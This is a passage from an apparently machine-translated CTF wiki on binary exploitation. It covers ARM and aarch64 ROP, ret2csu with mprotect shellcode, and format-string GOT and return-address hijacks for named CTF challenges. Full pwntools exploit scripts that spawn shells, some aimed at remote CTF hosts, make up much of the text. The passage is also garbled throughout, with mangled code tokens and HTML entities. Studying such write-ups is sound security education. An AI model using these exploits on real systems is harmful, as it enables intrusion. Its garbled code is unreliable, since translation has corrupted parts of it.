\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 \u2500\u2500\u2500\u2500\u2500\u2500 Invalid address 0x62616164 \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[ STACK ]\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 00:0000\u2502 sp 0xfffef098 \u25c2\u2014 0x62616165 ('eaab') 01: 0004\u2502 0xfffef09c \u25c2- 0x62616166 (&#39;faab&#39;) 02: 0008\u2502 0xfffef0a0 \u25c2- 0x62616167 (&#39;gaab&#39;) 03: 000c\u2502 0xfffef0a4 \u25c2\u2014 0x62616168 (&#39;haab&#39;) 04:0010\u2502 0xfffef0a8 \u25c2\u2014 0x62616169 ('iaab') 05: 0014\u2502 0xfffef0ac \u25c2- 0x6261616a (&#39;jaab&#39;) 06:0018\u2502 0xfffef0b0 \u25c2\u2014 0x6261616b ('kaab') 07: 001c\u2502 0xfffef0b4 \u25c2- 0x6261616c (&#39;boom&#39;) Program received signal SIGSEGV pwndbg> cyclic -l 0x62616164 112 So the padding length is 112 > Or you can blast the stack overflow directly more violently As for the address of system, because the binary is removed from the symbol table, we can first use rizzo to restore part of the symbol table (for the recovery symbol table, you can see the reference link first, and will introduce it later). Although rizzo does not work well on this binary, it is fortunate that there are just a few systems in the identified functions. char * __fastcall system ( int a1 ) { char * result ; // r0 if ( a1 ) result = sub_10BA8 ( a1 ); else result = ( char * )( sub_10BA8 (( int ) \"exit 0\" ) == 0 ); return result ; } > Or you can find the system function by searching for the /bin/sh string","title":"Constructing ROP"},{"location":"pwn/linux/arm/arm_rop/#exp","text":"All the conditions are there, construct system(\"/bin/sh\") jarvisOJ_typo [master\u25cf\u25cf] cat solve.py #!/usr/bin/env python # -*- coding: utf-8 -*- from pwn import * import sys import pdb # context.log_level = \"debug\" # for i in range(100, 150)[::-1]: for i in range(112, 123): if sys.argv[1] == \"l\": io = process (&quot;./ typo&quot;, timeout = 2) elif sys.argv [1] == &quot;d&quot;: io = process([\"qemu-arm\", \"-g\", \"1234\", \"./typo\"]) else: io = remote(\"pwn2.jarvisoj.com\", 9888, timeout = 2) io.sendafter(\"quit\\n\", \"\\n\") io.recvline () ''' jarvisOJ_typo [master\u25cf\u25cf] ROPgadget --binary ./typo --string /bin/sh Strings information ============================================================ 0x0006c384 : /bin/sh jarvisOJ_typo [master\u25cf\u25cf] ROPgadget --binary ./typo --only \"pop|ret\" | grep r0 0x00020904 : pop {r0, r4, pc} ''' payload = 'a' * i + p32(0x20904) + p32(0x6c384) * 2 + p32(0x110B4) success(i) io.sendlineafter(\"\\n\", payload) # pause() try: # pdb.set_trace() io.sendline (&quot;echo aaaa&quot;) io.recvuntil (&quot;aaaa&quot;, timeout = 1) except EOFError: io.close () continue else: io.interactive ()","title":"exp"},{"location":"pwn/linux/arm/arm_rop/#2018-shanghai-university-student-network-security-competition-baby_arm","text":"","title":"2018 Shanghai University Student Network Security Competition - baby_arm"},{"location":"pwn/linux/arm/arm_rop/#static-analysis","text":"The title gave a aarch64 schema file without open canary protection Shanghai2018_baby_arm [ master ] check ./pwn + file ./pwn ./pwn: ELF 64 -bit LSB executable, ARM aarch64, version 1 ( SYSV ) , dynamically linked, interpreter /lib/ld-linux-aarch64.so.1, for GNU/Linux 3 .7.0, BuildID [ sha1 ]= e988eaee79fd41139699d813eac0c375dbddba43, stripped + checksec ./pwn [ * ] '/home/m4x/pwn_repo/Shanghai2018_baby_arm/pwn' Arch: aarch64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE ( 0x400000 ) Look at the program logic __int64 main_logic () { Init (); write ( 1L L , \"Name:\" , 5L L ); read ( 0L L , input , 512L L ); sub_4007F0 (); return 0L L ; } void sub_4007F0 () { __int64 v0 ; // [xsp+10h] [xbp+10h] read ( 0L L , & v0 , 512L L ); } The trunk of the program reads 512 characters to a global variable, and in sub_4007F0() , it reads 512 bytes onto the stack. Note that this starts directly from frame pointer + 0x10 Read, so it doesn't matter if you turn on canary protection.","title":"Static analysis"},{"location":"pwn/linux/arm/arm_rop/#ideas","text":"Take a look at the idea, you can directly rop, but we do not know the remote libc version, but also found that the program has a code segment called mprotect .text:00000000004007C8 STP X29, X30, [SP,#-0x10]! .text:00000000004007CC MOV X29, SP .text:00000000004007D0 MOV W2, #0 .text:00000000004007D4 MOV X1, #0x1000 .text:00000000004007D8 MOV X0, #0x1000 .text:00000000004007DC MOVK X0, #0x41,LSL#16 .text:00000000004007E0 BL .mprotect .text:00000000004007E4 NOP .text:00000000004007E8 LDP X29, X30, [SP],#0x10 .text: 00000000004007EC RET But this code sets the permission bit of mprotect to 0, there is no executable permission, which requires us to control the permissions such as bss section by rop control mprotect to be writable executable. So you can have the following ideas: When you type name for the first time, write shellcode in the bss section. Call mprotect via rop to change the permissions of bss Return to the shellcode on bss mprotect needs to control three parameters, you can consider using ret2csu This method can be found as follows Gadgets to control the x0, x1, x2 registers .text:00000000004008AC LDR X3, [X21,X19,LSL#3] .text:00000000004008B0 MOV X2, X22 .text:00000000004008B4 MOV X1, X23 .text:00000000004008B8 MOV W0, W24 .text:00000000004008BC ADD X19, X19, #1 .text:00000000004008C0 BLR X3 .text:00000000004008C4 CMP X19, X20 .text:00000000004008C8 B.NE loc_4008AC .text:00000000004008CC .text:00000000004008CC loc_4008CC ; CODE XREF: sub_400868+3C\u2191j .text:00000000004008CC LDP X19, X20, [SP,#var_s10] .text:00000000004008D0 LDP X21, X22, [SP,#var_s20] .text:00000000004008D4 LDP X23, X24, [SP,#var_s30] .text:00000000004008D8 LDP X29, X30, [SP+var_s0],#0x40 .text: 00000000004008DC RET The final exp is as follows: #!/usr/bin/env python # -*- coding: utf-8 -*- from pwn import * import sys context . binary = \"./pwn\" context . log_level = \"debug\" if sys . argv [ 1 ] == \"l\" : io = process ([ & quot ; QEMU - aarch64 & quot ;, & quot ; - The & quot ;, & quot ; / usr / aarch64 - linux - gnu & quot ;, & quot ; ./ pwn & quot ;]) elif sys . argv [ 1 ] == & quot ; d & quot ;: io = process ([ & quot ; QEMU - aarch64 & quot ;, & quot ; G & quot ;, & quot ; 1234 & quot ;, & quot ; - The & quot ;, & quot ; / usr / aarch64 - linux - gnu & quot ;, & quot ; ./ pwn & quot ;]) else : io = remote ( & quot ; 106.75 . 126.171 & quot ;, 33865 ) def csu_rop ( call , x0 , x1 , x2 ): payload = flat ( 0x4008CC , '00000000' , 0x4008ac , 0 , 1 , call ) payload += flat ( x2 , x1 , x0 ) payload += '22222222' return payload if __name__ == \"__main__\" : elf = ELF ( \"./pwn\" , checksec = False ) padding = asm ( 'mov x0, x0' ) sc = asm ( shellcraft . execve ( \"/bin/sh\" )) # print disasm(padding * 0x10 + sc) io . sendafter ( \"Name:\" , padding * 0x10 + sc ) sleep ( 0.01 ) # io.send(cyclic(length = 500, n = 8)) # rop = flat() payload = flat ( cyclic ( 72 ), csu_rop ( elf . got [ 'read' ], 0 , elf . got [ '__gmon_start__' ], 8 )) payload += flat ( 0x400824 ) io . send ( payload ) sleep ( 0.01 ) io . send ( flat ( elf . plt [ 'mprotect' ])) sleep ( 0.01 ) raw_input ( \"DEBUG: \" ) io . sendafter ( \"Name:\" , padding * 0x10 + sc ) sleep ( 0.01 ) payload = flat ( cyclic ( 72 ), csu_rop ( elf . got [ '__gmon_start__' ], 0x411000 , 0x1000 , 7 )) payload += flat ( 0x411068 ) sleep ( 0.01 ) io . send ( payload ) io . interactive ()","title":"Ideas"},{"location":"pwn/linux/arm/arm_rop/#notice","text":"At the same time, it should be noted that the result of the checksec detection is that nx protection is turned on, but the result of this detection is not necessarily accurate, because the nx protection of the program can also be determined by the parameter -nx when qemu is started (such as this The problem can be nx protected by the error detection program when the remote fails. The old version of qemu may not have this parameter. Desktop ./qemu-aarch64 --version qemu-aarch64 version 2 .7.0, Copyright ( c ) 2003 -2016 Fabrice Bellard and the QEMU Project developers Desktop ./qemu-aarch64 -h | grep nx -nx QEMU_NX enable NX implementation If there is an error below, there is no assembler for aarch64 [ ERROR ] Could not find 'as' installed for ContextType ( arch = 'aarch64' , binary = ELF ( '/home/m4x/Projects/ctf-challenges/pwn/arm/Shanghai2018_baby_arm/pwn' ) , bits = 64 , endian = 'little' , log_level = 10 ) Try installing binutils for this architecture: https://docs.pwntools.com/en/stable/install/binutils.html Can refer to the official documentation solution Shanghai2018_baby_arm [ master\u25cf ] apt search binutils | grep aarch64 p binutils-aarch64-linux-gnu - GNU binary utilities, for aarch64-linux-gnu target p binutils-aarch64-linux-gnu:i386 - GNU binary utilities, for aarch64-linux-gnu target p binutils-aarch64-linux-gnu-dbg - GNU binary utilities, for aarch64-linux-gnu target ( debug symbols ) p binutils-aarch64-linux-gnu-dbg:i386 - GNU binary utilities, for aarch64-linux-gnu target ( debug symbols ) Shanghai2018_baby_arm [ master\u25cf ] sudo apt install bintuils-aarch64-linux-gnu > aarch64 files are arm64 when libc is installed and aarch64 when binutils is installed.","title":"notice"},{"location":"pwn/linux/arm/arm_rop/#example","text":"Codegate2015 - looked","title":"Example"},{"location":"pwn/linux/arm/arm_rop/#references","text":"http://www.freebuf.com/articles/terminal/134980.html","title":"references"},{"location":"pwn/linux/arm/environment/","text":"\u53c2\u89c1 ctf-tools","title":"Environment Setup"},{"location":"pwn/linux/fmtstr/fmtstr_detect/","text":"Format string vulnerability detection \u00b6 A simple tool [LazyIDA] ( https://github.com/L4ys/LazyIDA ) is recommended here. Basic testing should be no problem.","title":"Format String Vulnerability Detection"},{"location":"pwn/linux/fmtstr/fmtstr_detect/#format-string-vulnerability-detection","text":"A simple tool [LazyIDA] ( https://github.com/L4ys/LazyIDA ) is recommended here. Basic testing should be no problem.","title":"Format string vulnerability detection"},{"location":"pwn/linux/fmtstr/fmtstr_example/","text":"Format string vulnerability example \u00b6 The following is a description of some of the formatting vulnerabilities in the CTF. It is also a common use of formatted strings. 64-bit program format string vulnerability \u00b6 Principle \u00b6 In fact, the 64-bit offset calculation is similar to 32-bit, which is the corresponding parameter. Only the first six parameters of the 64-bit function are stored in the corresponding registers. So in the format string vulnerability? Although we did not put data into the corresponding registers, the program will still parse the format according to the format of the format string. Examples \u00b6 Here, we introduce the [pwn200 GoodLuck] ( https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/fmtstr/2017-UIUCTF-pwn200-GoodLuck ) in UIUCTF in 2017 as an example. . Since there is only a local environment, I have set a flag.txt file locally. Determining protection \u00b6 \u279c 2017 -UIUCTF-pwn200-GoodLuck git: ( master ) \u2717 checksec goodluck Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE ( 0x400000 ) It can be seen that the program has NX protection and partial RELRO protection enabled. \u5206\u6790\u7a0b\u5e8f \u00b6 It can be found that the vulnerability of the program is obvious for ( j = 0 ; j <= 21 ; ++ j ) { v5 = format [ j ]; if ( ! v5 || v11 [ j ] != v5 ) { puts ( \"You answered:\" ); printf ( format ); puts ( \" \\n But that was totally wrong lol get rekt\" ); fflush ( _bss_start ); result = 0 ; goto LABEL_11 ; } } Determining the offset \u00b6 We offset the following at printf, here we only focus on the code part and the stack part. gef\u27a4 b printf Breakpoint 1 at 0x400640 gef\u27a4 r Starting program: /mnt/hgfs/Hack/ctf/ctf-wiki/pwn/fmtstr/example/2017-UIUCTF-pwn200-GoodLuck/goodluck what 's the flag 123456 You answered: Breakpoint 1, __printf (format=0x602830 \"123456\") at printf.c:28 28 printf.c: There is no such file or directory. \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[ code:i386:x86-64 ]\u2500\u2500\u2500\u2500 0x7ffff7a627f7 <fprintf+135> add rsp, 0xd8 0x7ffff7a627fe <fprintf+142> right 0x7ffff7a627ff nop \u2192 0x7ffff7a62800 <printf+0> sub rsp, 0xd8 0x7ffff7a62807 <printf+7> test al, al 0x7ffff7a62809 <printf+9> mov QWORD PTR [rsp + 0x28], rsi 0x7ffff7a6280e <printf+14> mov QWORD PTR [rsp + 0x30], rdx \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[ stack ]\u2500\u2500\u2500\u2500 [' 0x7fffffffdb08 ', ' l8 ' ] 8 0x00007fffffffdb08\u2502+0x00: 0x0000000000400890 \u2192 <main+234> mov edi, 0x4009b8 \u2190 $rsp 0x00007fffffffdb10\u2502+0x08: 0x0000000031000001 0x00007fffffffdb18\u2502+0x10: 0x0000000000602830 \u2192 0x0000363534333231 ( \"123456\" ? ) 0x00007fffffffdb20\u2502 + 0x18: 0x0000000000602010 \u2192 & quot ; You answered: \\ ng & quot ; 0x00007fffffffdb28\u2502+0x20: 0x00007fffffffdb30 \u2192 \"flag{11111111111111111\" 0x00007fffffffdb30\u2502+0x28: \"flag{11111111111111111\" 0x00007fffffffdb38\u2502+0x30: \"11111111111111\" 0x00007fffffffdb40\u2502+0x38: 0x0000313131313131 ( \"111111\" ? ) \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 [ trace ] \u2500\u2500\u2500\u2500 [ #0] 0x7ffff7a62800 \u2192 Name: __printf(format=0x602830 \"123456\") [ #1] 0x400890 \u2192 Name: main() \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 It can be seen that the offset on the stack corresponding to the flag is 5, and the offset is 4 except for the corresponding first behavior return address. In addition, since this is a 64-bit program, the first 6 parameters exist in the corresponding registers, and the fmt string is stored in the RDI register, so the offset of the address corresponding to the fmt string is 10. The order corresponding to %order$s in the fmt string is the order of the arguments after the fmt string, so we only need to type %9$s to get the contents of the flag. Of course, we have an easier way to use fmtarg in https://github.com/scwuaptx/Pwngdb to determine the offset of a parameter. gef\u27a4 fmtarg 0x00007fffffffdb28 The index of format argument : 10 Note that we have to break at printf. Using the program \u00b6 from pwn import * from LibcSearcher import * goodluck = ELF ( './goodluck' ) if args [ 'REMOTE' ]: sh = remote ( 'pwn.sniperoj.cn' , 30017 ) else : sh = process ( './goodluck' ) payload = \"%9$s\" print payload ##gdb.attach(sh) sh . sendline ( payload ) print sh . recv () sh . interactive () hijack GOT \u00b6 Principle \u00b6 In the current C program, the functions in libc are all jumped through the GOT table. In addition, the GOT entry corresponding to each libc function can be modified without enabling RELRO protection. Therefore, we can modify the GOT table content of one libc function to the address of another libc function to achieve control of the program. For example, we can modify the contents of the got item of printf to the address of the system function. Thus, the program actually executes the system function when it executes printf. Suppose we override the address of function A as the address of function B, then this attack technique can be divided into the following steps. Determine the GOT table address of function A. The function A we used in this step is usually in the program, so we can find it by simply finding the address. Determine the memory address of function B This step usually requires us to find a way to leak the address of the corresponding function B. Write the memory address of function B to the GOT table address of function A. This step generally requires us to use the vulnerability of the function to trigger. The general use methods are as follows Write function: write function. ROP ```text pop eax; ret; # printf@got -> eax pop ebx; ret; # (addr_offset = system_addr - printf_addr) -> ebx add [eax] ebx; ret; # [printf@got] = [printf@got] + addr_offset ``` Format string to write at any address Examples \u00b6 Here we take [pwn3] ( https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/fmtstr/2016-CCTF-pwn3 ) in the 2016 CCTF as an example. Determining protection \u00b6 as follows \u279c 2016 -CCTF-pwn3 git: ( master ) \u2717 checksec pwn3 Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE ( 0x8048000 ) It can be seen that the program mainly turns on NX protection. We generally turn on ASLR protection by default. \u5206\u6790\u7a0b\u5e8f \u00b6 First analyze the program, you can find that the program seems to mainly implement a password-registered ftp, with three basic functions: get, put, dir. Probably look at the code for each feature and find a format string vulnerability in the get function. int get_file () { char dest ; // [sp+1Ch] [bp-FCh]@5 char s1 ; // [sp+E4h] [bp-34h]@1 char * i ; // [sp+10Ch] [bp-Ch]@3 printf ( \"enter the file name you want to get:\" ); __isoc99_scanf ( \"%40s\" , & s1 ); if ( ! strncmp ( & s1 , \"flag\" , 4u ) ) puts ( \"too young, too simple\" ); for ( i = ( char * ) file_head ; i ; i = ( char * ) * (( _DWORD * ) i + 60 ) ) { if ( ! strcmp ( i , & s1 ) ) { strcpy ( & amp ; dest , i + 0x28 ); return printf ( & amp ; dest ); } } return printf ( & amp ; dest ); } Exploiting ideas \u00b6 Since there is a format string vulnerability, we can determine the following ideas Bypass password Determine formatting string parameter offset Use put@got to get the put function address, and then get the corresponding version of libc.so, and then get the corresponding system function address. Modify the contents of puts@got to the address of system. When the program executes the puts function again, it actually executes the system function. Vulnerability Program \u00b6 as follows from pwn import * from LibcSearcher import LibcSearcher ##context.log_level = 'debug' pwn3 = ELF ( & #39;./pwn3&#39;) if args [ 'REMOTE' ]: sh = remote ( '111' , 111 ) else : sh = process ( './pwn3' ) def get ( name ): sh . sendline ( 'get' ) sh . recvuntil ( 'enter the file name you want to get:' ) sh . sendline ( name ) data = sh . recv () return data def put ( name , content ): sh . sendline ( 'put' ) sh . recvuntil ( 'please enter the name of the file you want to upload:' ) sh . sendline ( name ) sh . recvuntil ( 'then, enter the content:' ) sh . sendline ( content ) def show_dir (): sh . sendline ( & #39;you&#39;) tmp = 'sysbdmin' name = \"\" for i in tmp : name += chr ( ord ( i ) - 1 ) ## password def password (): sh . recvuntil ( 'Name (ftp.hacker.server:Rainism):' ) sh . sendline ( name ) ##password password () ## get the addr of puts puts_got = pwn3 . got [ 'puts' ] log . success ( 'puts got : ' + hex ( puts_got )) put ( '1111' , '%8$s' + p32 ( puts_got )) puts_addr = u32 ( get ( '1111' )[: 4 ]) ## get addr of system libc = LibcSearcher ( \"puts\" , puts_addr ) system_offset = libc . dump ( 'system' ) puts_offset = libc . dump ( 'puts' ) system_addr = puts_addr - puts_offset + system_offset log . success ( 'system addr : ' + hex ( system_addr )) ## modify puts@got, point to system_addr payload = fmtstr_payload ( 7 , { puts_got : system_addr }) put ( '/bin/sh;' , payload ) sh . recvuntil ( 'ftp>' ) sh . sendline ( 'get' ) sh . recvuntil ( 'enter the file name you want to get:' ) ##gdb.attach(sh) sh . sendline ( '/bin/sh;' ) ## system('/bin/sh') show_dir () sh . interactive () note The offset I used when getting the address of the puts function is 8, because I want the first 4 bytes of my output to be the address of the puts function. In fact, the offset of the first address of the format string is 7. Here I used the fmtstr_payload function in pwntools to get the results we hoped for. If you are interested, you can check the official documentation. For example, here fmtstr_payload(7, {puts_got: system_addr}) means that the offset of my format string is 7, I want to write the system_addr address at the puts_got address. By default it is written in bytes. hijack retaddr \u00b6 Principle \u00b6 It's easy to understand that we're going to use the format string vulnerability to hijack the return address of the program to the address we want to execute. Examples \u00b6 Here we take [three white hat-pwnme_k0] ( https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/fmtstr/three white hats-pwnme_k0) as an example for analysis. Determining protection \u00b6 \u279c Three white hats - pwnme_k0 git: ( master ) \u2717 checksec pwnme_k0 Arch: amd64-64-little RELRO: Full RELRO Stack: No canary found NX: NX enabled PIE: No PIE ( 0x400000 ) It can be seen that the program mainly opens NX protection and Full RELRO protection. This way we have no way to modify the got table of the program. \u5206\u6790\u7a0b\u5e8f \u00b6 A brief analysis, you know that the program seems to mainly implement a function similar to account registration, mainly modify the viewing function, and then found a format string vulnerability found in the viewing function. int __usercall sub_400B07 @ < eax > ( char format @ < dil > , char formata , __int64 a3 , char a4 ) { write ( 0 , \"Welc0me to sangebaimao! \\n \" , 0x1AuLL ); printf ( & amp ; formatata , & quot ; Welc0me to sangebaimao ! \\ n & quot ;); return printf ( & amp ; a4 + 4 ); } The output is &a4 + 4. Let\u2019s go back and find out that the password we read in is also v6 = read ( 0 , ( char * ) & a4 + 4 , 0x14uLL ); Of course, we can also find that the username we read in is 20 bytes from the password. puts ( \"Input your username(max lenth:20): \" ); fflush ( stdout ); v8 = read ( 0 , & bufa , 0x14uLL ); if ( v8 && v8 <= 0x14u ) { puts ( \"Input your password(max lenth:20): \" ); fflush ( stdout ); v6 = read ( 0 , ( char * ) & a4 + 4 , 0x14uLL ); fflush ( stdout ); * ( _QWORD * ) buf = bufa ; * ( _ QWORD * ) ( buf + 8 ) = a3 ; * ( _QWORD * )( buf + 16 ) = a4 ; Ok, this is almost the same. In addition, you can also find that this account password is not paired and not paired. Using ideas \u00b6 Our ultimate goal is to get the system's shell. We can find that in the given file, there is a function that directly calls system('bin/sh') at the address 0x00000000004008A6 (about this discovery, generally the program is now roughly take a look.). Then if we modify the return address of a function to this address, it is equivalent to getting the shell. Although the memory that stores the return address itself is dynamically changing, its address relative to rbp does not change, so we can use the relative address to calculate. Use ideas as follows Determine the offset Get the rbp and return address of the function Get the address where the return address is stored based on the relative offset Write the address of the execution system function call to the address where the return address is stored. Determining the offset \u00b6 First, let's first determine the offset. Enter the user name aaaaaaaa, enter the password casually, at the printf(&a4 + 4) function that outputs the password under the breakpoint. Register Account first! Input your username(max lenth:20): aaaaaaaa Input your password(max lenth:20): %p%p%p%p%p%p%p%p%p%p Register Success!! 1.Sh0w Account Infomation! 2.Ed1t Account Inf0mation! 3.QUit sangebaimao:( >error options 1.Sh0w Account Infomation! 2.Ed1t Account Inf0mation! 3.QUit sangebaimao:( >1 ... At this point the stack is \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[ code:i386:x86-64 ]\u2500\u2500\u2500\u2500 0x400b1a call 0x400758 0x400b1fe rdi, [rbp + 0x10] 0x400b23 mov eax, 0x0 \u2192 0x400b28 call 0x400770 \u21b3 0x400770 jmp QWORD PTR [rip+0x20184a] # 0x601fc0 0x400776 xchg ax, ax 0x400778 jmp QWORD PTR [rip+0x20184a] # 0x601fc8 0x40077e xchg ax, ax \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[ stack ]\u2500\u2500\u2500\u2500 0x00007fffffffdb40\u2502+0x00: 0x00007fffffffdb80 \u2192 0x00007fffffffdc30 \u2192 0x0000000000400eb0 \u2192 push r15 \u2190 $rsp, $rbp 0x00007fffffffdb48\u2502+0x08: 0x0000000000400d74 \u2192 add rsp, 0x30 0x00007fffffffdb50\u2502+0x10: \"aaaaaaaa\" \u2190 $rdi 0x00007fffffffdb58\u2502+0x18: 0x000000000000000a 0x00007fffffffdb60\u2502+0x20: 0x7025702500000000 0x00007fffffffdb68\u2502+0x28: \"%p%p%p%p%p%p%p%pM\\r@\" 0x00007fffffffdb70\u2502+0x30: \"%p%p%p%pM\\r@\" 0x00007fffffffdb78\u2502+0x38: 0x0000000000400d4d \u2192 cmp eax, 0x2 We can find that the user name we entered is in the third position on the stack, then the position of the format string itself is removed, and the offset is 5 + 3 = 8. Change address \u00b6 We will carefully observe the information of the stack at the breakpoint. 0x00007fffffffdb40\u2502+0x00: 0x00007fffffffdb80 \u2192 0x00007fffffffdc30 \u2192 0x0000000000400eb0 \u2192 push r15 \u2190 $rsp, $rbp 0x00007fffffffdb48\u2502+0x08: 0x0000000000400d74 \u2192 add rsp, 0x30 0x00007fffffffdb50\u2502+0x10: \"aaaaaaaa\" \u2190 $rdi 0x00007fffffffdb58\u2502+0x18: 0x000000000000000a 0x00007fffffffdb60\u2502+0x20: 0x7025702500000000 0x00007fffffffdb68\u2502+0x28: \"%p%p%p%p%p%p%p%pM\\r@\" 0x00007fffffffdb70\u2502+0x30: \"%p%p%p%pM\\r@\" 0x00007fffffffdb78\u2502+0x38: 0x0000000000400d4d \u2192 cmp eax, 0x2 You can see that the second location on the stack stores the return address of the function (in fact, the value stored in the push rip when the show account function is called), and the offset in the format string is 7. At the same time, on the stack, the first element stores the rbp of the previous function. So we can get the offset 0x00007fffffffdb80 - 0x00007fffffffdb48 = 0x38. Then if we know the value of rbp, we know the address of the function return address. 0x0000000000400d74 is different from 0x00000000004008A6 with only 2 bytes lower, so we can only modify 2 bytes starting at 0x00007fffffffdb48. It should be noted here that on some newer systems (such as ubuntu 18.04), the program crash may occur when the return address is directly modified to 0x00000000004008A6. In this case, you can consider modifying the return address to 0x00000000004008AA, that is, directly calling system(\"/bin /sh\") .text:00000000004008A6 sub_4008A6 proc near .text:00000000004008A6 ; __unwind { .text:00000000004008A6 push rbp .text:00000000004008A7 mov rbp, rsp .text:00000000004008AA <- here mov edi, offset command ; \"/bin/sh\" .text:00000000004008AF call system .text:00000000004008B4 pop rdi .text:00000000004008B5 pop rsi .text:00000000004008B6 pop rdx .text: 00000000004008B7 retn Using the program \u00b6 from pwn import * context . log_level = \"debug\" context . arch = \"amd64\" sh = process ( \"./pwnme_k0\" ) binary = ELF ( \"pwnme_k0\" ) #gdb.attach(sh) sh . recv () sh . writeline ( \"1\" * 8 ) sh . recv () sh . writeline ( \"%6$p\" ) sh . recv () sh . writeline ( \"1\" ) sh . recvuntil ( \"0x\" ) ret_addr = int ( sh . recvline () . strip (), 16 ) - 0x38 Success ( & quot ; ret_addr : & quot ; + Hex ( ret_addr )) sh . recv () sh . writeline ( \"2\" ) sh . recv () sh . sendline ( p64 ( ret_addr )) sh . recv () #sh.writeline(\"%2214d%8$hn\") #0x4008aa-0x4008a6 sh . writeline ( \" %2218d %8$hn\" ) sh . recv () sh . writeline ( \"1\" ) sh . recv () sh . interactive () Formatted string vulnerability on heap \u00b6 Principle \u00b6 The so-called formatted string on the heap means that the formatted string itself is stored on the heap. This mainly increases the difficulty of getting the corresponding offset. In general, the formatted string is likely to be copied. On the stack. Examples \u00b6 Here we take [contacts] ( https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/fmtstr/2015-CSAW-contacts ) in CSAW 2015 as an example. Determining protection \u00b6 \u279c 2015 -CSAW-contacts git: ( master ) \u2717 checksec contacts Arch: i386-32-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE ( 0x8048000 ) It can be seen that the program not only turns on NX protection but also turns on Canary. \u5206\u6790\u7a0b\u5e8f \u00b6 A simple look at the program, found that the program, as the name describes, is a contact-related program that can create, modify, delete, and print contact information. And after reading it 